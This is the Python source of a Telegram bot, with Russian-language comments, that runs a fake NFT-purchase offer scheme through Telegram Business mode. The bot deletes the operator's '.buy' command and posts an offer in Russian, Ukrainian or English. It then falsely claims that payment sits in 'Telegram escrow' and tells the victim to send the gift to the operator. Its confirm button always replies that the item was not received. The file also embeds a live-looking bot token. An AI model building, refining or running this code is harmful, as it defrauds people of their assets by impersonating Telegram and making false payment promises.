# bot_new.py — NFT Deal Bot | aiogram 3.31+ | Business Mode
import asyncio
import logging
import random
import re
import sqlite3
import string
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, Message,
    LinkPreviewOptions
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest

TOKEN    = "8726930734:AAESV0MI_3abx8lJwN9sJLuUfYSkiX_oKwY"
ADMIN_ID = 8926402887

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher()

# ── БД ───────────────────────────────────────────────────────
db = sqlite3.connect("deals.db", check_same_thread=False)
db.row_factory = sqlite3.Row
db.executescript("""
CREATE TABLE IF NOT EXISTS deals (
    order_id        TEXT PRIMARY KEY,
    buyer_username  TEXT,
    chat_id         INTEGER,
    nft_url         TEXT,
    nft_slug        TEXT,
    nft_num         TEXT,
    amount          INTEGER,
    currency        TEXT DEFAULT 's',
    lang            TEXT DEFAULT 'ru',
    status          TEXT DEFAULT 'offer',
    created_at      TEXT,
    biz_id          TEXT,
    offer_msg_id    INTEGER,
    sent_at         TEXT
);
CREATE TABLE IF NOT EXISTS allowed_users (
    user_id         INTEGER PRIMARY KEY
);
CREATE TABLE IF NOT EXISTS allowed_usernames (
    username        TEXT PRIMARY KEY
);
""")
db.commit()


# ── Доступ ───────────────────────────────────────────────────
def is_allowed(user_id: int, username: str = None) -> bool:
    if user_id == ADMIN_ID:
        return True
    row = db.execute("SELECT 1 FROM allowed_users WHERE user_id=?", (user_id,)).fetchone()
    if row:
        return True
    if username:
        uname = username.lstrip("@").lower()
        row2 = db.execute("SELECT 1 FROM allowed_usernames WHERE username=?", (uname,)).fetchone()
        if row2:
            return True
    return False

def add_user(value: str):
    value = value.strip()
    if value.lstrip("@").isdigit():
        db.execute("INSERT OR IGNORE INTO allowed_users (user_id) VALUES (?)", (int(value.lstrip("@")),))
    else:
        db.execute("INSERT OR IGNORE INTO allowed_usernames (username) VALUES (?)", (value.lstrip("@").lower(),))
    db.commit()

def remove_user(value: str):
    value = value.strip()
    if value.lstrip("@").isdigit():
        db.execute("DELETE FROM allowed_users WHERE user_id=?", (int(value.lstrip("@")),))
    else:
        db.execute("DELETE FROM allowed_usernames WHERE username=?", (value.lstrip("@").lower(),))
    db.commit()


# ── Переводы ─────────────────────────────────────────────────
TEXTS = {
    "ru": {
        "offer":         "Пользователь предлагает вам",
        "for":           "за подарок",
        "valid":         "Оффер действителен ещё",
        "order":         "Ордер",
        "reserved":      "Покупатель зарезервировал",
        "escrow":        ("через эскроу-систему Telegram. Средства хранятся на специальном "
                          "эскроу-счёте и будут автоматически зачислены на ваш баланс"),
        "after":         "сразу после передачи подарка.",
        "instr":         "Инструкция для завершения сделки:",
        "step1":         "Передайте подарок пользователю:",
        "step2":         "Нажмите «Передать NFT» и выберите",
        "step3":         "Подтвердите передачу подарка.",
        "credits":       "Telegram зафиксирует транзакцию и моментально зачислит",
        "balance":       "на ваш баланс. Резерв действует 24 часа.",
        "declined":      "Оффер на NFT",
        "declined_end":  "отменён.",
        "expired":       "Оффер истёк.",
        "warn":          ("Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок "
                          "и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение."),
        "not_received":  "Внимание!\n\nТовар не получен, попробуйте передать ещё раз и нажмите кнопку.",
        "transfer":      "Передать NFT ↗",
        "confirm":       "Подтвердить передачу",
        "accept":        "Принять",
        "decline":       "Отклонить",
        "no_access":     "У вас нет доступа к боту. Обратитесь к администратору.",
        "stars":         "Звёзд",
        "gram":          "GRAM",
    },
    "uk": {
        "offer":         "Користувач пропонує вам",
        "for":           "за подарунок",
        "valid":         "Пропозиція дійсна ще",
        "order":         "Замовлення",
        "reserved":      "Покупець зарезервував",
        "escrow":        ("через ескроу-систему Telegram. Кошти зберігаються на спеціальному "
                          "ескроу-рахунку та будуть автоматично зараховані на ваш баланс"),
        "after":         "одразу після передачі подарунку.",
        "instr":         "Інструкція для завершення угоди:",
        "step1":         "Передайте подарунок користувачу:",
        "step2":         "Натисніть «Передати NFT» та виберіть",
        "step3":         "Підтвердіть передачу подарунку.",
        "credits":       "Telegram зафіксує транзакцію та миттєво зарахує",
        "balance":       "на ваш баланс. Резерв діє 24 години.",
        "declined":      "Пропозицію на NFT",
        "declined_end":  "відхилено.",
        "expired":       "Пропозиція вичерпана.",
        "warn":          ("Увага!\n\nДотримуйтесь інструкції, щоб не втратити подарунок "
                          "та отримати оплату.\n\nНатисніть «ОК», якщо ви прочитали це повідомлення."),
        "not_received":  "Увага!\n\nТовар не отримано, спробуйте передати ще раз та натисніть кнопку.",
        "transfer":      "Передати NFT ↗",
        "confirm":       "Підтвердити передачу",
        "accept":        "Прийняти",
        "decline":       "Відхилити",
        "no_access":     "У вас немає доступу до бота. Зверніться до адміністратора.",
        "stars":         "Зірок",
        "gram":          "GRAM",
    },
    "en": {
        "offer":         "A user offers you",
        "for":           "for the gift",
        "valid":         "Offer valid for another",
        "order":         "Order",
        "reserved":      "The buyer has reserved",
        "escrow":        ("via Telegram escrow. Funds are held in a dedicated escrow account "
                          "and will be automatically credited to your balance"),
        "after":         "immediately after the gift is transferred.",
        "instr":         "Instructions to complete the deal:",
        "step1":         "Transfer the gift to:",
        "step2":         "Tap «Transfer NFT» and select",
        "step3":         "Confirm the gift transfer.",
        "credits":       "Telegram will record the transaction and instantly credit",
        "balance":       "to your balance. The reserve is valid for 24 hours.",
        "declined":      "Offer for NFT",
        "declined_end":  "declined.",
        "expired":       "Offer expired.",
        "warn":          ("Attention!\n\nFollow the instructions to avoid losing the gift "
                          "and to receive your payment.\n\nPress «OK» if you have read this message."),
        "not_received":  "Attention!\n\nItem not received. Please try transferring again and press the button.",
        "transfer":      "Transfer NFT ↗",
        "confirm":       "Confirm transfer",
        "accept":        "Accept",
        "decline":       "Decline",
        "no_access":     "You don't have access to this bot. Contact the administrator.",
        "stars":         "Stars",
        "gram":          "GRAM",
    },
}

def T(lang, key):
    return TEXTS.get(lang, TEXTS["ru"]).get(key, TEXTS["ru"][key])


# ── Хелперы ──────────────────────────────────────────────────
def gen_order_id() -> str:
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

def parse_nft(url: str):
    m = re.search(r"t\.me/nft/([A-Za-z]+)-(\d+)", url)
    if not m:
        return None, None
    slug, num = m.group(1), m.group(2)
    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
    return name, num

def get_deal(order_id: str) -> dict | None:
    row = db.execute("SELECT * FROM deals WHERE order_id=?", (order_id,)).fetchone()
    return dict(row) if row else None

def upd(order_id: str, **kw):
    for k, v in kw.items():
        db.execute(f"UPDATE deals SET {k}=? WHERE order_id=?", (v, order_id))
    db.commit()

def fmt_remaining(sent_at_str: str) -> str:
    sent_at   = datetime.fromisoformat(sent_at_str)
    deadline  = sent_at + timedelta(hours=6)
    remaining = deadline - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0 ч. 0 мин."
    total_min = int(remaining.total_seconds() // 60)
    h, m = divmod(total_min, 60)
    return f"{h} ч. {m} мин."

def fmt_amount(amount: int, currency: str, lang: str) -> str:
    if currency == "s":
        return f"<b>{amount:,} ⭐️ {T(lang, 'stars')}</b>"
    return f"<b>{amount:,} {T(lang, 'gram')}</b>"

def fmt_amount_plain(amount: int, currency: str, lang: str) -> str:
    if currency == "s":
        return f"{amount:,} ⭐️ {T(lang, 'stars')}"
    return f"{amount:,} {T(lang, 'gram')}"

def cur_name(currency: str, lang: str) -> str:
    return T(lang, "stars") if currency == "s" else T(lang, "gram")


# ── Тексты ───────────────────────────────────────────────────
def offer_text_plain(d: dict) -> str:
    lang = d.get("lang", "ru")
    return (
        f"{T(lang,'offer')} {fmt_amount(d['amount'], d['currency'], lang)} "
        f"{T(lang,'for')} <b>{d['nft_slug']} #{d['nft_num']}</b>.\n\n"
        f"{T(lang,'valid')} <b>{fmt_remaining(d['sent_at'])}</b>"
    )

def offer_text_linked(d: dict) -> str:
    lang = d.get("lang", "ru")
    return (
        f"{T(lang,'offer')} {fmt_amount(d['amount'], d['currency'], lang)} "
        f"{T(lang,'for')} <b><a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a></b>.\n\n"
        f"{T(lang,'valid')} <b>{fmt_remaining(d['sent_at'])}</b>"
    )

def deal_text(d: dict) -> str:
    lang = d.get("lang", "ru")
    cur  = fmt_amount_plain(d['amount'], d['currency'], lang)
    return (
        f"{T(lang,'order')} <b>#{d['order_id']}</b>\n\n"
        f"{T(lang,'reserved')} <b>{cur}</b> {T(lang,'escrow')} "
        f"{cur_name(d['currency'], lang)} {T(lang,'after')}\n\n"
        f"<b>{T(lang,'instr')}</b>\n"
        f"1. {T(lang,'step1')} @{d['buyer_username']}\n"
        f"2. {T(lang,'step2')} <a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a>\n"
        f"3. {T(lang,'step3')}\n\n"
        f"{T(lang,'credits')} <b>{cur}</b> {T(lang,'balance')}"
    )


# ── Клавиатуры ───────────────────────────────────────────────
def offer_kb(order_id: str, lang: str = "ru"):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text=T(lang,"decline"), callback_data=f"decline:{order_id}"),
        InlineKeyboardButton(text=T(lang,"accept"),  callback_data=f"accept:{order_id}"),
    )
    return kb.as_markup()

def deal_kb(d: dict):
    lang = d.get("lang", "ru")
    kb = InlineKeyboardBuilder()
    kb.row(InlineKeyboardButton(
        text=T(lang,"transfer"),
        url=f"tg://send_gift?to={d['buyer_username']}",
    ))
    kb.row(InlineKeyboardButton(
        text=T(lang,"confirm"),
        callback_data=f"confirm:{d['order_id']}",
    ))
    return kb.as_markup()

def admin_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="✅ Подтвердить", callback_data=f"adm_ok:{order_id}"),
        InlineKeyboardButton(text="❌ Не передан",  callback_data=f"adm_no:{order_id}"),
    )
    return kb.as_markup()

def lp_show(nft_url: str) -> LinkPreviewOptions:
    return LinkPreviewOptions(
        url=nft_url,
        show_above_text=True,
        prefer_large_media=True,
    )


# ── Таймер оффера ────────────────────────────────────────────
async def offer_timer(order_id: str):
    while True:
        await asyncio.sleep(60)
        d = get_deal(order_id)
        if not d or d["status"] != "offer":
            break
        deadline = datetime.fromisoformat(d["sent_at"]) + timedelta(hours=6)
        if datetime.now() >= deadline:
            upd(order_id, status="expired")
            try:
                await bot.edit_message_text(
                    T(d.get("lang","ru"), "expired"),
                    business_connection_id=d["biz_id"] or None,
                    chat_id=d["chat_id"],
                    message_id=d["offer_msg_id"],
                    reply_markup=None,
                )
            except Exception:
                pass
            break
        try:
            await bot.edit_message_text(
                offer_text_linked(d),
                business_connection_id=d["biz_id"] or None,
                chat_id=d["chat_id"],
                message_id=d["offer_msg_id"],
                reply_markup=offer_kb(order_id, d.get("lang","ru")),
                link_preview_options=lp_show(d["nft_url"]),
            )
        except Exception:
            pass


# ── /start ───────────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(message: Message):
    user_id = message.from_user.id
    if user_id == ADMIN_ID:
        await message.answer("👋 Добро пожаловать, админ.")
        return
    if not is_allowed(user_id, message.from_user.username):
        await message.answer("Бот недоступен.")
        return
    await message.answer(
        "Формат команды:\n"
        "<code>.buy https://t.me/nft/Name-123 7373 g</code> — GRAM\n"
        "<code>.buy https://t.me/nft/Name-123 500 s</code> — Stars\n"
        "<code>.buy https://t.me/nft/Name-123 500 s uk</code> — украинский\n"
        "<code>.buy https://t.me/nft/Name-123 500 s en</code> — английский"
    )


# ── /add /remove /users ───────────────────────────────────────
@dp.message(F.text.startswith("/add "))
async def cmd_add(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        val = message.text.split()[1]
        add_user(val)
        await message.answer(f"✅ Доступ выдан: {val}")
    except Exception:
        await message.answer("Формат: /add 123456789 или /add @username")

@dp.message(F.text.startswith("/remove "))
async def cmd_remove(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    try:
        val = message.text.split()[1]
        remove_user(val)
        await message.answer(f"✅ Доступ забран: {val}")
    except Exception:
        await message.answer("Формат: /remove 123456789 или /remove @username")

@dp.message(F.text == "/users")
async def cmd_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    ids   = db.execute("SELECT user_id FROM allowed_users").fetchall()
    names = db.execute("SELECT username FROM allowed_usernames").fetchall()
    if not ids and not names:
        await message.answer("Список пуст.")
        return
    lines = [str(r["user_id"]) for r in ids] + ["@" + r["username"] for r in names]
    await message.answer("Пользователи с доступом:\n" + "\n".join(lines))


# ── .buy ─────────────────────────────────────────────────────
CMD_RE = re.compile(
    r"^\.buy\s+(https?://t\.me/nft/\S+)\s+(\d+)\s+(s|g)(?:\s+(uk|en))?",
    re.IGNORECASE
)

@dp.message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
@dp.business_message(F.text.regexp(r"^\.buy\s+\S+\s+\d+"))
async def cmd_buy(message: Message):
    biz_id = message.business_connection_id

    if biz_id:
        try:
            biz_conn = await bot.get_business_connection(biz_id)
            owner_id = biz_conn.user.id
            if message.from_user.id != owner_id:
                return
            owner_username = biz_conn.user.username
            if not is_allowed(owner_id, owner_username):
                await bot.send_message(owner_id, T("ru", "no_access"))
                return
            buyer_username = owner_username or str(owner_id)
        except Exception:
            return
    else:
        if not is_allowed(message.from_user.id, message.from_user.username):
            await message.answer(T("ru", "no_access"))
            return
        buyer_username = message.from_user.username or str(message.from_user.id)

    m = CMD_RE.match((message.text or "").strip())
    if not m:
        return

    nft_url  = m.group(1)
    amount   = int(m.group(2))
    currency = m.group(3).lower()            # s | g
    lang     = (m.group(4) or "ru").lower()  # ru | uk | en

    slug, num = parse_nft(nft_url)
    if not slug:
        return

    order_id = gen_order_id()
    chat_id  = message.chat.id
    sent_at  = datetime.now().isoformat()

    db.execute("""
        INSERT INTO deals
          (order_id, buyer_username, chat_id, nft_url, nft_slug, nft_num,
           amount, currency, lang, status, created_at, biz_id, sent_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'offer', ?, ?, ?)
    """, (order_id, buyer_username, chat_id, nft_url, slug, num,
          amount, currency, lang, sent_at, biz_id or "", sent_at))
    db.commit()

    d = get_deal(order_id)
    send_kw = {"business_connection_id": biz_id} if biz_id else {}

    # ШАГ 1: без превью (PEER_FLOOD fix — работает и для biz и для обычного)
    try:
        msg = await bot.send_message(
            chat_id,
            offer_text_plain(d),
            reply_markup=offer_kb(order_id, lang),
            link_preview_options=LinkPreviewOptions(is_disabled=True),
            **send_kw,
        )
        upd(order_id, offer_msg_id=msg.message_id)
        logging.info(f"offer sent: {order_id} chat={chat_id} biz={biz_id}")
    except Exception as e:
        logging.error(f"SEND OFFER ERROR: {e!r}")
        return

    # Удаляем .buy после успешной отправки оффера
    try:
        if biz_id:
            await bot.delete_business_messages(
                business_connection_id=biz_id,
                message_ids=[message.message_id],
            )
        else:
            await bot.delete_message(chat_id=chat_id, message_id=message.message_id)
    except Exception as e:
        logging.error(f"delete .buy: {e}")

    # ШАГ 2: редактируем со ссылкой и превью
    await asyncio.sleep(1.5)
    try:
        await bot.edit_message_text(
            offer_text_linked(d),
            chat_id=chat_id,
            message_id=msg.message_id,
            reply_markup=offer_kb(order_id, lang),
            link_preview_options=lp_show(nft_url),
            **send_kw,
        )
    except TelegramBadRequest as e:
        logging.error(f"edit offer: {e}")

    asyncio.create_task(offer_timer(order_id))

    # Уведомление админу о новом оффере
    try:
        await bot.send_message(
            ADMIN_ID,
            f"📤 <b>Новый оффер отправлен</b>\n\n"
            f"Ордер: <b>{order_id}</b>\n"
            f"NFT: <b>{slug} #{num}</b>\n"
            f"Сумма: <b>{fmt_amount_plain(amount, currency, lang)}</b>\n"
            f"От: @{buyer_username}\n"
            f"Ссылка: {nft_url}",
        )
    except Exception as e:
        logging.error(f"admin offer notify: {e}")


# ── Принять ──────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("accept:"))
async def cb_accept(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d or d["status"] != "offer":
        await call.answer("Оффер недоступен.", show_alert=True)
        return

    lang = d.get("lang", "ru")

    # Сначала отвечаем — размораживаем кнопку
    await call.answer(T(lang, "warn"), show_alert=True)

    # Меняем статус
    upd(order_id, status="active")

    biz_id = d["biz_id"] or None
    try:
        await bot.edit_message_text(
            deal_text(d),
            business_connection_id=biz_id,
            chat_id=d["chat_id"],
            message_id=d["offer_msg_id"],
            reply_markup=deal_kb(d),
            link_preview_options=lp_show(d["nft_url"]),
        )
    except Exception as e:
        logging.error(f"edit to deal: {e}")
        # Откат — чтобы повторное нажатие сработало
        upd(order_id, status="offer")


# ── Отклонить ────────────────────────────────────────────────
@dp.callback_query(F.data.startswith("decline:"))
async def cb_decline(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status="declined")
    lang = d.get("lang", "ru")
    await call.answer(T(lang, "declined_end"))

    biz_id = d["biz_id"] or None
    try:
        await bot.edit_message_text(
            f"{T(lang,'declined')} <a href=\"{d['nft_url']}\">{d['nft_slug']} #{d['nft_num']}</a> {T(lang,'declined_end')}",
            business_connection_id=biz_id,
            chat_id=d["chat_id"],
            message_id=d["offer_msg_id"],
            reply_markup=None,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"edit decline: {e}")


# ── Подтвердить передачу ─────────────────────────────────────
@dp.callback_query(F.data.startswith("confirm:"))
async def cb_confirm(call: CallbackQuery):
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d or d["status"] != "active":
        await call.answer("Ордер недоступен.", show_alert=True)
        return

    lang = d.get("lang", "ru")
    await call.answer(T(lang, "not_received"), show_alert=True)

    try:
        await bot.send_message(
            ADMIN_ID,
            f"🔔 <b>Попытка подтверждения</b>\n\n"
            f"Ордер: <b>{d['order_id']}</b>\n"
            f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
            f"Сумма: <b>{fmt_amount_plain(d['amount'], d['currency'], lang)}</b>\n"
            f"Покупатель: @{d['buyer_username']}\n"
            f"Ссылка: {d['nft_url']}\n\n"
            f"Нажми если NFT реально передан:",
            reply_markup=admin_kb(order_id),
        )
    except Exception as e:
        logging.error(f"admin notify: {e}")


# ── Админ: подтвердить ───────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_ok:"))
async def cb_adm_ok(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status="completed")
    await call.answer("Подтверждено.")
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(f"Ордер {order_id} завершён.")

    lang   = d.get("lang", "ru")
    biz_id = d["biz_id"] or None
    try:
        await bot.send_message(
            d["chat_id"],
            f"Передача подтверждена!\n\n"
            f"{T(lang,'order')} <b>{d['order_id']}</b>\n"
            f"<b>{fmt_amount_plain(d['amount'], d['currency'], lang)}</b> зачислены на ваш баланс.",
            business_connection_id=biz_id,
        )
    except Exception as e:
        logging.error(e)


# ── Админ: не передан ────────────────────────────────────────
@dp.callback_query(F.data.startswith("adm_no:"))
async def cb_adm_no(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return

    upd(order_id, status="active")
    await call.answer("Отклонено.")
    await call.message.edit_reply_markup(reply_markup=None)

    biz_id = d["biz_id"] or None
    try:
        await bot.edit_message_reply_markup(
            business_connection_id=biz_id,
            chat_id=d["chat_id"],
            message_id=d["offer_msg_id"],
            reply_markup=deal_kb(d),
        )
    except Exception as e:
        logging.error(e)


# ── Catch-all ────────────────────────────────────────────────
@dp.message()
async def catch_all(message: Message):
    if message.from_user.id == ADMIN_ID:
        return
    if not is_allowed(message.from_user.id, message.from_user.username):
        await message.answer("Бот недоступен.")


async def main():
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
    await dp.start_polling(
        bot,
        skip_updates=True,
        allowed_updates=[
            "message",
            "callback_query",
            "business_connection",
            "business_message",
            "edited_business_message",
            "deleted_business_messages",
        ],
    )

if __name__ == "__main__":
    asyncio.run(main())
